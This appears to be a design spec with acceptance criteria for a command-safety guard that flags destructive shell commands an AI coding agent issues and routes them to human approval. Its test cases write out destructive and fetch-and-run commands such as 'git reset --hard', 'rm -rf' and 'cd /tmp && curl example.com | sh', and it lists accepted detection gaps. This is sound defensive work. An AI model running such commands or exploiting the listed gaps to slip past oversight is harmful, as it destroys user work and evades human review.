userStories.title: Rule set v3 catches path-scoped discards; detectTmpWrite stops over-exempting
userStories.description:
**Goal** — Expand deterministic discard detection and correct the nax-owned temp-tree exception.

**Motivation** — The rule scorer misses 11 of the 22 labelled `discards_work` commands. Every miss has one of two shapes: `git checkout <path>` without `--`, and `git restore <path>`. Four new patterns catch all 11, add 0 hits on the other 4,459 labels, and add 20 hits on 8,291 live rows, all of them real discards.

**Approach** — `RULE_SET_VERSION` — `src/command-safety/rule-scorer.ts:26`. Baseline: `2`. Target: `3`.
- `RULES.discards_work` — `src/command-safety/rule-scorer.ts:35-47`. Baseline: 11 patterns. Target: the same 11 plus four patterns, each matched within one shell segment (never across `;`, `&` or `|`):
  1. `git checkout` followed only by non-flag words, at least one of which ends in `/` or ends in a dot plus a letter-led extension (`src/a.ts`, `scripts/baselines/`). A branch name such as `main`, `feature/x` or `release/v0.82.1`, and a tag such as `v0.83.0`, is not matched.
  2. `git restore` with at least one non-flag word and no `--staged` or `-S` flag in the segment.
  3. `git restore` with `--worktree` or `-W` in the segment, even when `--staged` is also present.
  4. `git checkout` or `git switch` with `-f`, `--force` or `--discard-changes` in the segment.
- `isNaxTempTree(path, root)` (private) — `src/command-safety/tmp-write.ts:66`. Baseline: exempts `<root>/nax/…` and any path starting with `<root>/nax-`. Target: exempts `<root>/nax/…` and `<root>/nax-<digits>` where the digits are the whole path segment (the per-user fallback `/tmp/nax-<uid>`), and nothing else. Update the obsolete `/tmp/nax-r1` test to `/tmp/nax/r1`, and the stale tmp-write and `signals.tmpWrite` docs.

**Scope** — In: version, four bounded patterns, exact nax exemption, existing tests and docs. Out: new temp-only predicate (US-002), guard scoring/config (US-003), runtime ask routing (US-004); A rule for moving a tracked source file out of the repo (`mv src/x.ts /tmp/x`); it is labelled `deletes_data` (2 labelled misses) and belongs to a later rule-set change.

**Interface**
```typescript
export const RULE_SET_VERSION = 3;
export function scoreRules(command: string, context?: RuleContext): RuleResult;
export function detectTmpWrite(command: string, cwd?: string): boolean;
```
acceptanceCriteria: scoreRules("git checkout src/cli/approvals.ts").hits.discards_work returns true.
scoreRules("git checkout scripts/baselines/").hits.discards_work returns true.
scoreRules("git checkout HEAD src/index.ts").hits.discards_work returns true.
scoreRules("bun test && git checkout docs/guides/cli-reference.md").hits.discards_work returns true.
scoreRules("git restore test/unit/config/schemas-review.test.ts").hits.discards_work returns true.
scoreRules("git restore --staged --worktree src/a.ts").hits.discards_work returns true.
scoreRules("git restore --staged src/a.ts").hits.discards_work returns false.
scoreRules("git restore -S src/a.ts").hits.discards_work returns false.
scoreRules("git checkout -f main").hits.discards_work returns true.
scoreRules("git switch --discard-changes main").hits.discards_work returns true.
scoreRules(c).hits.discards_work returns false for each of `git checkout main`, `git checkout feature/x`, `git checkout -b feature/new`, `git checkout release/v0.82.1` and `git checkout v0.83.0`.
scoreRules("git checkout main; ls src/").hits.discards_work returns false; a path in a later segment does not make an earlier branch checkout a discard.
scoreRules("git restore src/a.ts; git diff --staged").hits.discards_work returns true; a `--staged` in a later segment does not suppress the restore.
When reading `RULE_SET_VERSION` and `scoreRules("ls").version`, then both equal 3.
detectTmpWrite("echo x > /tmp/nax-red-check/a.txt") returns true.
detectTmpWrite("cp a.txt /private/tmp/nax-scratch/a.txt") returns true.
detectTmpWrite("echo x > /tmp/nax-501/r1/a.txt") returns false; a numeric per-user fallback root stays exempt.
detectTmpWrite("echo x > /tmp/nax/r1/a.txt") returns false.
detectTmpWrite("echo x > /tmp/nax-501x/a.txt") returns true; the fallback segment must be all digits.

routing.reasoning: Localized deterministic patterns and path-boundary correction are medium-sized, but the resulting rule hits narrow command permissions, so the access-control security override requires strict TDD.

modifiedFiles.reason: the test "version is 2 and every category is reported" asserts `RULE_SET_VERSION` is `2`. The rule set gains four `discards_work` patterns, which bumps it to `3`, so the assertion becomes `3`; the category-list assertion is unchanged.

the test "US-005 AC7: nax's own /tmp/nax-* run directory is not counted" asserts that a write into the legacy run directory tmp/nax-r1 is not counted. Since #2285 no run directory has that layout: nax's own temp trees are tmp/nax/(runId) and the all-digit per-user fallback tmp/nax-(uid), and the confined sandbox denies writes to any other tmp/nax-(name) directory. The assertion becomes: a write to the same file under tmp/nax/r1 (the shared parent) is not counted.

userStories.title: isTempOnly predicate
acceptanceCriteria: When `isTempOnly("cp src/a.ts /tmp/a.bak", "/repo/proj")` is called through the `@/command-safety` barrel, then it returns true.
isTempOnly("cat /tmp/out.txt", "/repo/proj") returns true; a temp read counts.
isTempOnly("echo x > $TMPDIR/a.txt", "/repo/proj") returns true.
isTempOnly("cd /tmp/work && git init", "/repo/proj") returns true.
isTempOnly("cat /private/tmp/x.log", "/repo/proj") returns true.
isTempOnly("bun build --outdir=/tmp/b src/a.ts", "/repo/proj") returns true; a `--flag=value` token is judged by its value.
isTempOnly("cat /repo/proj/src/a.ts > /tmp/x", "/repo/proj") returns true; a path under `cwd` is allowed.
isTempOnly("echo x > /dev/null; cp a.txt /tmp/b", "/repo/proj") returns true.
isTempOnly("ls src", "/repo/proj") returns false; no temp path appears.
isTempOnly("cp /tmp/a ~/b", "/repo/proj") returns false.
isTempOnly("cat /tmp/a ../other/b", "/repo/proj") returns false; the relative path resolves outside `cwd`.
isTempOnly("cat /etc/hosts > /tmp/x", "/repo/proj") returns false.
isTempOnly("cp a.txt $OUT/x", "/repo/proj") returns false; an opaque path word other than `$TMPDIR` cannot be judged.
isTempOnly("cat > /tmp/a.txt << 'EOF'\nx\nEOF", "/repo/proj") returns false; the lexer refuses the heredoc.
isTempOnly("cp a.txt /tmp/b", undefined) returns false.
isTempOnly("tar -C/etc -xf /tmp/a.tar", "/repo/proj") returns false; an attached short-option value containing `/` cannot be judged.
isTempOnly("curl https://example.com/x -o /tmp/x", "/repo/proj") returns false; a URL token cannot be judged.
isTempOnly("cat $TMPDIR/../../etc/x", "/repo/proj") returns false.
isTempOnly("cat $TMPDIRX/a", "/repo/proj") returns false.
isTempOnly("cd $D && cp a/b /tmp/x", "/repo/proj") returns false; after an unresolvable `cd` a relative path cannot be judged.

routing.reasoning: A predicate, barrel export and tests are a focused change, but cwd/opaque-path classification controls when the guard skips its classifier, making strict security TDD necessary.

userStories.title: Guard configuration and rule-or-mean scoring
acceptanceCriteria: CommandSafetyConfigSchema.parse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: {} }).guard.threshold returns 0.75.
CommandSafetyConfigSchema.safeParse({ guard: { threshold: 0.6 } }) fails with an issue whose message is `commandSafety.guard requires commandSafety.shadow (the guard reuses its classifier)`.
CommandSafetyConfigSchema.safeParse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: { threshold: 1.5 } }) fails.
CommandSafetyConfigSchema.safeParse({ shadow: { url: "http://127.0.0.1:8020/x" }, guard: { threshold: 0 } }) fails; the threshold must be greater than 0.
When reading `FIELD_DESCRIPTIONS["execution.commandSafety.guard"]` and `FIELD_DESCRIPTIONS["execution.commandSafety.guard.threshold"]`, then both are non-empty strings.
CommandSafetyConfigSchema.parse({ shadow: { url: "http://127.0.0.1:8020/x" } }).guard returns undefined.
When `buildCommandShadow` receives config with shadow and no guard, then its returned shadow.guard is undefined.

When `buildDispatchAskWiring` receives execution.commandSafety `{ shadow: { url: "http://127.0.0.1:8020/x", timeoutMs: 3000, authEnv: "NAX_COMMAND_SAFETY_AUTH", allowRemote: false }, guard: { threshold: 0.6 } }`, then wiring.commandShadow.guard.threshold equals 0.6.

When the guard fixture receives the high answered result, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged true, basis `model`, score 0.9 within 1e-9, and category `discards_work`.
When the guard fixture receives the low answered result, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged false and basis `model`.

When the guard fixture receives the low answered result, then `guard.assess({ command: "git reset --hard", cwd: "/repo/proj", tempConfined: false })` resolves flagged true, score 1, basis `model` and category `discards_work`, because a rule hit scores 1.

When the guard fixture classifier returns `{ status: "unavailable", error: "timeout" }`, then `guard.assess({ command: "git checkout src/a.ts", cwd: "/repo/proj", tempConfined: false })` resolves flagged true, basis `rules` and category `discards_work`.

When the guard fixture classifier returns `{ status: "unavailable", error: "timeout" }`, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged false, score 0 and basis `rules`.

When the guard fixture classifier returns `{ status: "oversize", latencyMs: 1 }`, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged false and basis `rules`.

When the guard fixture classifier returns `{ status: "blocked", latencyMs: 1 }`, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged true, score 1, basis `model`, and no category.
When the guard fixture classify throws synchronously, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves (does not reject) flagged false and basis `rules`.

When the guard fixture receives the high answered result, then `guard.assess({ command: "cp src/a.ts /tmp/a.bak", cwd: "/repo/proj", tempConfined: true })` resolves flagged false with basis `temp-only`, and the stub classify records no call.

When the guard fixture receives the low answered result, then `guard.assess({ command: "rm -rf /tmp/x", cwd: "/repo/proj", tempConfined: true })` resolves flagged true with basis `temp-only` and category `deletes_data`.

When the guard fixture receives the high answered result, then `guard.assess({ command: "cp src/a.ts /tmp/a.bak", cwd: "/repo/proj", tempConfined: false })` resolves basis `model`, and stub classify records the command once.

When the low-answer guard fixture calls observe for `bun run test` and then `guard.assess({ command: "bun run test", cwd: "/repo/proj", tempConfined: false })`, then stub classify records exactly one call.

When the guard fixture uses threshold 0.5 and an answered result with harm none 0.5, deletes_data 0.5, and every noul P(yes) 0.5, then `guard.assess({ command: "ls", cwd: "/repo/proj", tempConfined: false })` resolves flagged true; a score equal to the threshold flags.
When `createCommandShadow` is called without a guard option, then its returned shadow.guard is undefined.

When the guard fixture classifier returns `{ status: "unavailable", error: "timeout" }`, then `guard.assess({ command: "sudo git reset --hard", cwd: "/repo/proj", tempConfined: false })` resolves category `discards_work`; with both `discards_work` and `privilege` hitting, the first in `QUESTION_IDS` order wins.

routing.reasoning: New permission-narrowing guard across config, model cache and scoring; access-control security override requires strict isolation.

userStories.title: The runtime turns a flagged allowed call into an ask
acceptanceCriteria: When an allowed Bash call `git checkout src/a.ts` has a guard assessment `{ flagged: true, score: 0.9, threshold: 0.75, basis: "model", category: "discards_work" }` and no askResolver, then runtime.callTool returns kind `denied` with reason containing `flagged for review by command safety: discards_work (score 0.90 >= 0.75)` and `no approval channel is configured`, and Bash never runs.

When the same flagged Bash call has an askResolver returning `{ decision: "allow", decidedBy: "test", latencyMs: 1 }`, then runtime.callTool returns kind `ok`, Bash runs once, and the resolver records one request with rule `command-safety` and command `git checkout src/a.ts`.
When the same flagged Bash call has an askResolver returning `{ decision: "deny", decidedBy: "human", latencyMs: 1 }`, then runtime.callTool returns kind `denied` and Bash never runs.
When guard.assess resolves flagged false for an allowed `callTool("Bash", { command: "ls" })`, then runtime.callTool returns kind `ok`, Bash runs once, and the askResolver receives no request.
When policy denies `callTool("Bash", { command: "ls" })`, then guard.assess is never called.
When policy returns ask for `callTool("Bash", { command: "ls" })`, then guard.assess is never called and the askResolver records exactly one request whose rule is not `command-safety`.
When `callTool("Read", { path: "a.txt" })` is allowed, then guard.assess is never called.
When commandShadow has no guard and an allowed `callTool("Bash", { command: "ls" })` runs, then runtime.callTool returns kind `ok`.

When `createCodingToolRuntime` receives `tempConfined: true` and policy root `/repo/proj`, then `callTool("Bash", { command: "ls" })` calls guard.assess with `{ command: "ls", cwd: "/repo/proj", tempConfined: true }`.
When `createCodingToolRuntime` omits tempConfined, then allowed `callTool("Bash", { command: "ls" })` passes tempConfined false to guard.assess.

When a runtime uses the real `createCommandShadow` guard fixture with a low answer and headless resolver, then `callTool("Bash", { command: "git checkout src/a.ts" })` returns kind `denied` and stub classify records that command exactly once.

When guard.assess rejects with `new Error("boom")` on allowed `callTool("Bash", { command: "ls" })`, then Bash runs once, runtime.callTool returns kind `ok`, and `getSafeLogger()` records exactly one warn at stage `command-safety` with message `Command-safety guard failed; the call runs unguarded`.

When a runtime with `compileToolPolicy([{ tool: "Exec", patterns: ["*"] }], "/repo")`, `createRunCommandTool(new Map(), { exec })`, no askResolver and a flagging guard calls `callTool("RunCommand", { argv: ["git", "checkout", "src/a.ts"] })`, then guard.assess receives command `git checkout src/a.ts` and the result is kind `denied`.

When `buildCodingToolSupport` receives an available launcher with state `{ kind: "available", backend: "srt", network: "open", sharedTmp: false }`, then its runtime's allowed `callTool("Bash", { command: "ls" })` passes tempConfined true to guard.assess.

When `buildCodingToolSupport` receives an available launcher with state `{ kind: "available", backend: "srt", network: "open" }` (no sharedTmp), then its runtime's allowed Bash call passes tempConfined false to guard.assess.
When `buildCodingToolSupport` receives a launcher with state `DISABLED_SANDBOX_STATE`, then its runtime's allowed Bash call passes tempConfined false to guard.assess.

routing.reasoning: Cross-cutting access-control integration at tool execution with ask routing, sandbox state, audit and fail-open error handling.

analysis: This is an enhancement to existing TypeScript/Bun code. src/command-safety/rule-scorer.ts:26-62 defines version 2 and 11 discard rules; scoreRules at :134 masks the project root for outside_project only. New discard patterns must not cross shell separators; existing tests are test/unit/command-safety/rule-scorer.test.ts:5-112. src/command-safety/tmp-write.ts:66-73 mistakenly exempts all nax-* names and :89-105 uses lexed redirects, write targets and working-directory frames; update the obsolete nax-r1 assertion in test/unit/command-safety/tmp-write.test.ts:28-70. src/permissions/bash-lex.ts:22-61 defines token opacity, segments, redirects and refusal; lexBashCommand starts at :104. The new predicate should reuse its lexer, reject refused syntax, reject unjudgable paths and propagate unknown cwd after unresolvable cd. src/command-safety/types.ts:11-24 orders six QUESTION_IDS; :39-58 defines ModelResult; :89-99 defines CommandShadow; :130-138 documents tmpWrite. src/command-safety/shadow.ts:25-32 declares options, :68-98 caches classification by exact command and :151-203 implements total observe/settle/drain; guard assessment must reuse the cached promise without adding row fields. src/command-safety/build.ts:18-52 structurally types config without importing src/config and creates the classifier; src/config/schemas-command-safety.ts:46-50 contains the Zod config and src/cli/config-descriptions.ts:132-140 maps execution keys. src/interaction/dispatch-ask.ts:165-175 already forwards commandSafety whole to buildCommandShadow. Export new APIs in src/command-safety/index.ts:1-28. src/tools/runtime.ts:122-180 accepts runtime options and defaults to the headless resolver; :301-478 checks policy, opens shadow tap, resolves policy ask/deny then runs allowed tools. src/tools/runtime-calltool.ts:75-94 maps argv calls to Exec policy identity, :97-134 opens the shadow tap and :136-209 resolves asks and cancellation. New guard checks must occur only on allowed Bash/Exec calls after tap opening, preserving mechanical allow and logging denied:ask on refusal. src/agents/coding-tool-support.ts:178-184 treats Exec as a capability marker and :239-283 constructs the runtime; its frozen complexity baseline is 38. src/agents/coding-tool-sandbox.ts:177-197 provides launcher state helpers: confinement requires kind available and sharedTmp === false. Existing runtime and wiring tests include test/unit/tools/runtime-command-shadow.test.ts, test/unit/tools/runtime-calltool-edges.test.ts, test/unit/command-safety/shadow.test.ts, test/unit/config/command-safety-config.test.ts and the stub launcher in test/unit/agents/coding-tool-support-sandbox-wrapped.test.ts:25-64. docs/guides/sandbox-and-command-safety.md:1-20 incorrectly says the shadow decides nothing; update for optional guard. Migration is opt-in: no guard preserves all current policy behavior and shadow rows; guard requires shadow, defaults to threshold 0.75, uses the unchanged ask resolver, and never broadens a deny or ask. Rule-set v3 and numeric-only nax fallback change prior rule and tmp signal outputs; accepted branch-extension and no-URL remote-code residuals are explicit feature exclusions.
outOfScope: Recording the guard's decision (score, basis, category) on the command-safety row. It is derivable offline: a row with mechanical `allow` and outcome `denied:ask`, plus the row's rules and model answers.
A per-run ask budget, rate limit or de-duplication of guard asks beyond the existing approvals cache.
A rule for moving a tracked source file out of the repo (`mv src/x.ts /tmp/x`); it is labelled `deletes_data` (2 labelled misses) and belongs to a later rule-set change.
Making the scorer configurable; `ruleOrMean` is fixed. Only the threshold is configurable.
Changing the question set, the classifier model, or its calibration.
Changing the headless ask resolver or any ask-channel behaviour.
Guarding `RunCommand` verb calls (D14: they run user-declared commands) or any identity other than `Bash` and `Exec`.
Turning the guard on by default or adding it to any shipped profile.
Special handling of turn cancellation while the guard awaits the classifier; the wait is bounded by `commandSafety.shadow.timeoutMs` and the existing post-approval signal check applies.
Exempting temp-only commands when the sandbox is unavailable or `execution.sandbox.filesystem.allowSharedTmp` is true.

Telling a branch name that ends in a letter-led extension (`release/v1.x`, `origin/topic.a`) from a path: `git checkout` of such a branch matches the new `discards_work` pattern and asks. This residual is accepted.

Commands that name no path at all but fetch and run remote code without a URL scheme (`cd /tmp && curl example.com | sh`). If one is temp-only, only the rule families stand between it and a skipped classifier; the `network_send` rules do not match a plain `curl` download. This residual is accepted.
Guarding a `Bash` call whose `command` is not a string, or an argv call whose `argv` is not a string array; the policy refuses malformed input before the guard is reached.
